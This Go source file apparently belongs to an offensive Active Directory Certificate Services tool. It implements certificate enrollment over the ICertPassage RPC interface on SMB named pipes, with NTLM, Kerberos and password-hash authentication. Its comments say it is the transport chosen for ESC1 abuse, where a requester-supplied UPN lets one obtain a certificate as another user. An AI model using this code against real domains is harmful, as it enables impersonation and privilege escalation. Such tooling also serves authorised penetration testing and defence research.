package pki

import (
	"crypto/x509"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"time"
)

// ICertPassage interface UUID: 91ae6020-9e3c-11cf-8d7c-00aa00c091be v0.0
// MS-ICPR: ICertPassage Remote Protocol
var icertPassageUUID = [16]byte{
	0x20, 0x60, 0xae, 0x91, 0x3c, 0x9e, 0xcf, 0x11,
	0x8d, 0x7c, 0x00, 0xaa, 0x00, 0xc0, 0x91, 0xbe,
}

// CertServerRequest disposition values
const (
	crDispIssued          = 3
	crDispUnderSubmission = 5
)

// CertServerRequest dwFlags request type constants (MS-WCCE 3.2.1.4.2.1.2)
const (
	crInBinary = 0x02  // CR_IN_BINARY — raw binary encoding
	crInPKCS10 = 0x100 // CR_IN_PKCS10 — PKCS#10 certificate request
	crInCMC    = 0x300 // CR_IN_CMC — CMC full PKI request (CMS SignedData wrapping)
)

// EnrollCertificateRPC performs certificate enrollment via MS-ICPR
// (ICertPassage::CertServerRequest) over DCE/RPC on a named pipe.
// This is the correct transport for ESC1 — the RPC interface honors
// the UPN SAN from the CSR when CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is set,
// unlike the certsrv web enrollment which ignores CSR SAN extensions.
// Uses CR_IN_PKCS10 request type for standard PKCS#10 CSR enrollment.
func EnrollCertificateRPC(cfg *ADCSConfig, caHostname, caName, templateName string, csrDER []byte) (*x509.Certificate, error) {
	return EnrollCertificateRPCWithFlags(cfg, caHostname, caName, templateName, csrDER, crInBinary|crInPKCS10)
}

// EnrollCertificateRPCWithFlags performs certificate enrollment via MS-ICPR
// with explicit dwFlags control. The requestFlags parameter sets the request
// type in the CertServerRequest stub:
//   - crInBinary|crInPKCS10 (0x102): standard PKCS#10 CSR
//   - crInBinary|crInCMC    (0x302): CMC full PKI request (CMS SignedData wrapping)
func EnrollCertificateRPCWithFlags(cfg *ADCSConfig, caHostname, caName, templateName string, requestBlob []byte, requestFlags uint32) (*x509.Certificate, error) {
	fmt.Printf("[*] RPC enrollment via ICertPassage on %s (flags=0x%X)\n", caHostname, requestFlags)

	conn, err := net.DialTimeout("tcp", caHostname+":445", 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("connect to %s:445: %w", caHostname, err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	s := &smbSession{conn: conn}

	// SMB2 negotiate
	if err := s.negotiate(); err != nil {
		return nil, fmt.Errorf("SMB negotiate: %w", err)
	}

	// Authenticated session setup
	if cfg.Kerberos {
		if err := s.sessionSetupKerberos(cfg, caHostname); err != nil {
			return nil, fmt.Errorf("SMB Kerberos auth: %w", err)
		}
		fmt.Printf("[+] SMB2 Kerberos session established (authenticated as %s)\n", cfg.Username)
	} else {
		if err := s.sessionSetupNTLM(cfg); err != nil {
			return nil, fmt.Errorf("SMB NTLM auth: %w", err)
		}
		fmt.Printf("[+] SMB2 session established (authenticated as %s)\n", cfg.Username)
	}

	// Tree connect to IPC$
	if err := s.treeConnect(caHostname); err != nil {
		return nil, fmt.Errorf("SMB tree connect IPC$: %w", err)
	}

	// Open the cert named pipe
	if err := s.createPipe("cert"); err != nil {
		return nil, fmt.Errorf("open \\pipe\\cert: %w", err)
	}
	fmt.Printf("[+] Opened pipe: \\pipe\\cert\n")

	// RPC bind to ICertPassage
	if err := rpcBind(s, icertPassageUUID); err != nil {
		return nil, fmt.Errorf("RPC bind ICertPassage: %w", err)
	}
	fmt.Printf("[+] RPC bind to ICertPassage successful\n")

	// Build attributes string: "CertificateTemplate:<name>"
	attribs := fmt.Sprintf("CertificateTemplate:%s", templateName)

	// Call CertServerRequest (opnum 0)
	certDER, disposition, err := certServerRequestWithFlags(s, caName, attribs, requestBlob, requestFlags)
	if err != nil {
		return nil, fmt.Errorf("CertServerRequest: %w", err)
	}

	switch disposition {
	case crDispIssued:
		fmt.Printf("[+] Certificate issued (disposition=%d)\n", disposition)
	case crDispUnderSubmission:
		return nil, fmt.Errorf("certificate request pending CA admin approval (disposition=%d)", disposition)
	default:
		return nil, fmt.Errorf("enrollment failed (disposition=%d)", disposition)
	}

	if len(certDER) == 0 {
		return nil, fmt.Errorf("CA returned empty certificate")
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, fmt.Errorf("parse certificate: %w", err)
	}

	return cert, nil
}

// sessionSetupNTLM performs NTLM-authenticated SMB2 session setup.
// Reuses the NTLM message building from ntlm.go.
func (s *smbSession) sessionSetupNTLM(cfg *ADCSConfig) error {
	// Round 1: Send NTLMSSP Negotiate
	hdr1 := s.smb2Header(0x0001) // SESSION_SETUP
	body1 := make([]byte, 24)
	binary.LittleEndian.PutUint16(body1[0:2], 25) // StructureSize

	negMsg := buildNegotiateMessage() // from ntlm.go
	secOffset1 := uint16(64 + 24)
	binary.LittleEndian.PutUint16(body1[12:14], secOffset1)
	binary.LittleEndian.PutUint16(body1[14:16], uint16(len(negMsg)))
	body1 = append(body1, negMsg...)

	pkt1 := smbPacket(hdr1, body1)
	if _, err := s.conn.Write(pkt1); err != nil {
		return err
	}

	resp1, err := readSMB2Response(s.conn)
	if err != nil {
		return fmt.Errorf("negotiate round: %w", err)
	}

	// Extract session ID
	if len(resp1) >= 48 {
		s.sessionID = binary.LittleEndian.Uint64(resp1[40:48])
	}

	// Extract NTLMSSP challenge from the security buffer in SESSION_SETUP response
	challenge, err := extractSMBSecurityBuffer(resp1)
	if err != nil {
		return fmt.Errorf("extract challenge: %w", err)
	}

	// Round 2: Build and send NTLMSSP Authenticate using real credentials
	transport := &NTLMTransport{
		Domain:   cfg.Domain,
		Username: cfg.Username,
		Password: cfg.Password,
		Hash:     cfg.Hash,
	}
	authMsg, err := transport.buildAuthenticateMessage(challenge)
	if err != nil {
		return fmt.Errorf("build auth message: %w", err)
	}

	hdr2 := s.smb2Header(0x0001) // SESSION_SETUP
	body2 := make([]byte, 24)
	binary.LittleEndian.PutUint16(body2[0:2], 25)
	secOffset2 := uint16(64 + 24)
	binary.LittleEndian.PutUint16(body2[12:14], secOffset2)
	binary.LittleEndian.PutUint16(body2[14:16], uint16(len(authMsg)))
	body2 = append(body2, authMsg...)

	pkt2 := smbPacket(hdr2, body2)
	if _, err := s.conn.Write(pkt2); err != nil {
		return err
	}

	resp2, err := readSMB2Response(s.conn)
	if err != nil {
		return fmt.Errorf("auth round: %w", err)
	}

	if len(resp2) >= 48 {
		s.sessionID = binary.LittleEndian.Uint64(resp2[40:48])
	}

	return nil
}

// extractSMBSecurityBuffer extracts the NTLMSSP token from an SMB2 SESSION_SETUP response.
// The security buffer offset/length are in the response body (after 64-byte SMB2 header).
func extractSMBSecurityBuffer(resp []byte) ([]byte, error) {
	if len(resp) < 64+8 {
		return nil, fmt.Errorf("response too short for security buffer: %d bytes", len(resp))
	}

	// SESSION_SETUP response body starts at offset 64
	// StructureSize(2) + SessionFlags(2) + SecurityBufferOffset(2) + SecurityBufferLength(2)
	secOffset := binary.LittleEndian.Uint16(resp[64+4 : 64+6])
	secLength := binary.LittleEndian.Uint16(resp[64+6 : 64+8])

	if secLength == 0 {
		return nil, fmt.Errorf("empty security buffer")
	}

	// secOffset is from the start of the SMB2 header (not including NetBIOS)
	start := int(secOffset)
	end := start + int(secLength)
	if end > len(resp) {
		return nil, fmt.Errorf("security buffer overflows response: offset=%d len=%d respLen=%d", secOffset, secLength, len(resp))
	}

	return resp[start:end], nil
}

// certServerRequest calls ICertPassage::CertServerRequest (opnum 0)
// with default PKCS#10 flags (CR_IN_BINARY | CR_IN_PKCS10 = 0x102).
func certServerRequest(s *smbSession, caName, attribs string, csrDER []byte) ([]byte, uint32, error) {
	return certServerRequestWithFlags(s, caName, attribs, csrDER, crInBinary|crInPKCS10)
}

// certServerRequestWithFlags calls ICertPassage::CertServerRequest (opnum 0)
// with explicit dwFlags control.
//
// NDR layout for CertServerRequest:
//
//	[in]  DWORD dwFlags          - request type flags (CR_IN_BINARY|CR_IN_PKCS10 or CR_IN_BINARY|CR_IN_CMC)
//	[in]  [string,unique] wchar_t* pwszAuthority - CA name
//	[in,out] DWORD* pdwRequestId - request ID (0 for new)
//	[in]  CERTTRANSBLOB ctbAttribs - attributes string (UTF-16LE)
//	[in]  CERTTRANSBLOB ctbRequest - CSR or CMC blob (DER)
//
// Returns: certificate DER bytes, disposition, error
func certServerRequestWithFlags(s *smbSession, caName, attribs string, requestBlob []byte, flags uint32) ([]byte, uint32, error) {
	callID := rand.Uint32()

	// Build NDR stub data
	stub := buildCertServerRequestStubWithFlags(caName, attribs, requestBlob, flags)

	// DCE/RPC request header (type 0x00)
	reqHdr := make([]byte, 8)
	binary.LittleEndian.PutUint32(reqHdr[0:4], uint32(len(stub))) // alloc hint
	binary.LittleEndian.PutUint16(reqHdr[4:6], 0)                 // context_id
	binary.LittleEndian.PutUint16(reqHdr[6:8], 0)                 // opnum 0 = CertServerRequest

	fragLen := uint16(16 + len(reqHdr) + len(stub))
	hdr := make([]byte, 16)
	hdr[0] = 5    // version major
	hdr[1] = 0    // version minor
	hdr[2] = 0x00 // REQUEST
	hdr[3] = 0x03 // first+last fragment
	hdr[4] = 0x10 // data rep: little-endian
	binary.LittleEndian.PutUint16(hdr[8:10], fragLen)
	binary.LittleEndian.PutUint32(hdr[12:16], callID)

	var rpcReq []byte
	rpcReq = append(rpcReq, hdr...)
	rpcReq = append(rpcReq, reqHdr...)
	rpcReq = append(rpcReq, stub...)

	if err := s.writePipe(rpcReq); err != nil {
		return nil, 0, fmt.Errorf("write CertServerRequest: %w", err)
	}

	// Read response
	resp, err := s.readPipe()
	if err != nil {
		return nil, 0, fmt.Errorf("read CertServerRequest response: %w", err)
	}

	return parseCertServerResponse(resp)
}

// buildCertServerRequestStub builds the NDR-encoded stub data for
// ICertPassage::CertServerRequest (opnum 0) with default PKCS#10 flags.
func buildCertServerRequestStub(caName, attribs string, csrDER []byte) []byte {
	return buildCertServerRequestStubWithFlags(caName, attribs, csrDER, crInBinary|crInPKCS10)
}

// buildCertServerRequestStubWithFlags builds the NDR-encoded stub data for
// ICertPassage::CertServerRequest (opnum 0) with explicit dwFlags.
func buildCertServerRequestStubWithFlags(caName, attribs string, requestBlob []byte, flags uint32) []byte {
	var stub []byte

	// dwFlags: request type (e.g. CR_IN_BINARY|CR_IN_PKCS10=0x102, CR_IN_BINARY|CR_IN_CMC=0x302)
	stub = appendLE32(stub, flags)

	// pwszAuthority: [string,unique] wchar_t*
	// NDR unique pointer: referent ID (non-zero) + conformant varying string
	stub = ndrUniqueString(stub, caName)

	// pdwRequestId: [in,out] DWORD* — pointer to 0
	stub = appendLE32(stub, 0) // request ID = 0 (new request)

	// ctbAttribs: CERTTRANSBLOB { cb: DWORD, pb: [size_is(cb)] BYTE* }
	attribsUTF16 := utf16LEEncode(attribs)
	stub = ndrCertTransBlob(stub, attribsUTF16)

	// ctbRequest: CERTTRANSBLOB { cb: DWORD, pb: [size_is(cb)] BYTE* }
	stub = ndrCertTransBlob(stub, requestBlob)

	return stub
}

// ndrUniqueString appends an NDR unique pointer to a conformant varying string (UTF-16LE).
func ndrUniqueString(buf []byte, s string) []byte {
	if s == "" {
		return appendLE32(buf, 0) // null pointer
	}

	utf16 := utf16LEEncode(s)
	charCount := uint32(len(utf16)/2 + 1) // +1 for null terminator

	buf = appendLE32(buf, 0x00020000) // referent ID (non-zero = valid pointer)
	buf = appendLE32(buf, charCount)  // max count
	buf = appendLE32(buf, 0)          // offset
	buf = appendLE32(buf, charCount)  // actual count
	buf = append(buf, utf16...)
	buf = append(buf, 0, 0) // null terminator (UTF-16LE)
	// Pad to 4-byte alignment
	for len(buf)%4 != 0 {
		buf = append(buf, 0)
	}
	return buf
}

// ndrCertTransBlob appends an NDR-encoded CERTTRANSBLOB structure.
// CERTTRANSBLOB: { cb: DWORD, pb: [size_is(cb),unique] BYTE* }
func ndrCertTransBlob(buf []byte, data []byte) []byte {
	cb := uint32(len(data))
	buf = appendLE32(buf, cb) // cb (byte count)

	if cb == 0 {
		buf = appendLE32(buf, 0) // null pointer
		return buf
	}

	buf = appendLE32(buf, 0x00020004) // referent ID (non-zero)
	buf = appendLE32(buf, cb)         // max count (conformant array size)
	buf = append(buf, data...)
	// Pad to 4-byte alignment
	for len(buf)%4 != 0 {
		buf = append(buf, 0)
	}
	return buf
}

// parseCertServerResponse parses the NDR response from CertServerRequest.
// Returns: certificate DER, disposition, error
func parseCertServerResponse(resp []byte) ([]byte, uint32, error) {
	// Skip SMB2 header (64 bytes) to get to the pipe data
	// But readPipe returns the full SMB2 response, and the read data
	// is at header(64) + READ response body offset

	// Find the DCE/RPC response within the SMB2 READ response
	rpcData, err := extractRPCFromReadResponse(resp)
	if err != nil {
		return nil, 0, fmt.Errorf("extract RPC data: %w", err)
	}

	// DCE/RPC response header is 16 bytes + 8 bytes request header = 24 bytes
	if len(rpcData) < 24 {
		return nil, 0, fmt.Errorf("RPC response too short: %d bytes", len(rpcData))
	}

	pktType := rpcData[2]
	if pktType == 0x03 { // FAULT
		if len(rpcData) >= 28 {
			faultStatus := binary.LittleEndian.Uint32(rpcData[24:28])
			return nil, 0, fmt.Errorf("RPC fault: status=0x%08X", faultStatus)
		}
		return nil, 0, fmt.Errorf("RPC fault")
	}
	if pktType != 0x02 { // RESPONSE
		return nil, 0, fmt.Errorf("unexpected RPC packet type: 0x%02X", pktType)
	}

	// Stub data starts after 24 bytes (16 header + 8 response header)
	stub := rpcData[24:]

	// Parse response stub:
	// pdwRequestId: DWORD
	// pdwDisposition: DWORD
	// pctbCertChain: CERTTRANSBLOB (we skip this)
	// pctbEncodedCert: CERTTRANSBLOB (this is what we want)
	// pctbDispositionMessage: CERTTRANSBLOB
	// return value: HRESULT (DWORD)

	if len(stub) < 8 {
		return nil, 0, fmt.Errorf("response stub too short: %d bytes", len(stub))
	}

	requestID := binary.LittleEndian.Uint32(stub[0:4])
	disposition := binary.LittleEndian.Uint32(stub[4:8])
	_ = requestID

	fmt.Printf("[*] Request ID: %d, Disposition: %d\n", requestID, disposition)

	// Parse the CERTTRANSBLOB fields to find the encoded certificate
	offset := 8

	// pctbCertChain: CERTTRANSBLOB
	_, offset, err = readCertTransBlob(stub, offset)
	if err != nil {
		return nil, disposition, fmt.Errorf("parse cert chain blob: %w", err)
	}

	// pctbEncodedCert: CERTTRANSBLOB — this is the issued certificate
	certData, offset, err := readCertTransBlob(stub, offset)
	if err != nil {
		return nil, disposition, fmt.Errorf("parse encoded cert blob: %w", err)
	}

	// We got the cert (or nil if denied)
	if disposition == crDispIssued && len(certData) > 0 {
		// The cert data might be a PKCS7 envelope — extract the leaf cert
		cert, parseErr := extractCertFromPKCS7(certData)
		if parseErr == nil {
			return cert, disposition, nil
		}
		// Try as raw DER
		return certData, disposition, nil
	}

	// Try to get disposition message for error context
	dispMsg, _, _ := readCertTransBlob(stub, offset)
	if len(dispMsg) > 0 {
		msg := utf16LEDecode(dispMsg)
		return nil, disposition, fmt.Errorf("CA disposition %d: %s", disposition, msg)
	}

	return nil, disposition, nil
}

// readCertTransBlob reads a CERTTRANSBLOB from NDR stub data at the given offset.
// Returns the blob data, the new offset, and any error.
func readCertTransBlob(stub []byte, offset int) ([]byte, int, error) {
	if offset+4 > len(stub) {
		return nil, offset, fmt.Errorf("offset %d: not enough data for cb", offset)
	}

	cb := binary.LittleEndian.Uint32(stub[offset : offset+4])
	offset += 4

	if cb == 0 {
		// Check for null pointer
		if offset+4 <= len(stub) {
			ptr := binary.LittleEndian.Uint32(stub[offset : offset+4])
			if ptr == 0 {
				offset += 4
			}
		}
		return nil, offset, nil
	}

	// Read pointer (referent ID)
	if offset+4 > len(stub) {
		return nil, offset, fmt.Errorf("offset %d: not enough data for pointer", offset)
	}
	offset += 4 // skip referent ID

	// Read max count (conformant array)
	if offset+4 > len(stub) {
		return nil, offset, fmt.Errorf("offset %d: not enough data for max_count", offset)
	}
	maxCount := binary.LittleEndian.Uint32(stub[offset : offset+4])
	offset += 4

	dataLen := int(maxCount)
	if dataLen > int(cb) {
		dataLen = int(cb)
	}

	if offset+dataLen > len(stub) {
		return nil, offset, fmt.Errorf("offset %d: not enough data for blob (%d bytes)", offset, dataLen)
	}

	data := make([]byte, dataLen)
	copy(data, stub[offset:offset+dataLen])
	offset += dataLen

	// Align to 4 bytes
	for offset%4 != 0 {
		offset++
	}

	return data, offset, nil
}

// extractRPCFromReadResponse extracts the DCE/RPC data from an SMB2 READ response.
func extractRPCFromReadResponse(resp []byte) ([]byte, error) {
	// SMB2 READ response: header(64) + body
	// Body: StructureSize(2) + DataOffset(1) + reserved(1) + DataLength(4) + ...
	// Data starts at the DataOffset from the start of the SMB2 header
	if len(resp) < 64+16 {
		return nil, fmt.Errorf("response too short for READ: %d bytes", len(resp))
	}

	dataOffset := resp[64+2] // DataOffset byte
	dataLength := binary.LittleEndian.Uint32(resp[64+4 : 64+8])

	start := int(dataOffset)
	end := start + int(dataLength)
	if end > len(resp) {
		// Fall back: just take everything after the READ response header
		start = 64 + 16
		end = len(resp)
	}

	if start >= len(resp) {
		return nil, fmt.Errorf("data offset %d beyond response length %d", start, len(resp))
	}

	return resp[start:end], nil
}

// extractCertFromPKCS7 attempts to extract a leaf certificate from PKCS7 SignedData.
// The CA may return the cert wrapped in a PKCS7 envelope.
func extractCertFromPKCS7(data []byte) ([]byte, error) {
	// Try parsing as a raw certificate first
	if _, err := x509.ParseCertificate(data); err == nil {
		return data, nil
	}

	// Try parsing as PKCS7 — look for the certificate sequence
	// PKCS7 SignedData wraps certs in a SEQUENCE. We look for the first
	// certificate by scanning for the X.509 certificate SEQUENCE tag.
	certs, err := x509.ParseCertificates(data)
	if err == nil && len(certs) > 0 {
		return certs[0].Raw, nil
	}

	return nil, fmt.Errorf("cannot extract certificate from %d-byte blob", len(data))
}

// utf16LEDecode converts UTF-16LE bytes to a Go string.
func utf16LEDecode(b []byte) string {
	if len(b)%2 != 0 {
		b = b[:len(b)-1]
	}
	runes := make([]rune, 0, len(b)/2)
	for i := 0; i+1 < len(b); i += 2 {
		r := rune(binary.LittleEndian.Uint16(b[i : i+2]))
		if r == 0 {
			break
		}
		runes = append(runes, r)
	}
	return string(runes)
}

// buildNTLMSSPNegotiateAuth builds an NTLMSSP Negotiate message suitable for
// SMB2 authenticated session setup. Uses the same flags as buildNegotiateMessage
// from ntlm.go but is duplicated here to avoid coupling.
func buildNTLMSSPNegotiateAuth() []byte {
	return buildNegotiateMessage()
}

// stripDomain removes the @domain suffix from a UPN if present.
func stripDomain(upn string) string {
	if idx := strings.Index(upn, "@"); idx > 0 {
		return upn[:idx]
	}
	return upn
}
